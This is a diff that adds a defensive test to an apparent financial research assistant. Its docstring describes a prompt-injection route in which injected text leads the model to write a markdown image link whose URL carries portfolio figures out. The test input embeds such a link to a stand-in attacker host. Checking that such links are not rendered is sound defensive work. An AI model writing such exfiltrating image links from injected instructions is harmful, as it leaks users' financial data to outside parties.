@@ -1977,3 +1977,15 @@ def test_a_portfolio_review_still_routes_to_the_review_refusal():
     )
     assert "render_review" in out
     assert "render_stock_report" not in out
+
+
+def test_model_written_markdown_cannot_make_the_report_fetch_a_url():
+    """Injected text could get the model to write ![](https://host/p.png?nav=…);
+    headless Chrome and fpdf both fetch image URLs, carrying the figures out."""
+    from financial_research_assistant import reports
+
+    html = reports._markdown_html("NAV is 123,456.\n\n![](https://attacker.example/p.png?nav=123456)")
+    assert "<img" not in html
+    assert "123,456" in html
+    for page in (reports._DOC, reports._INFO_DOC):
+        assert "Content-Security-Policy" in page and "default-src 'none'" in page
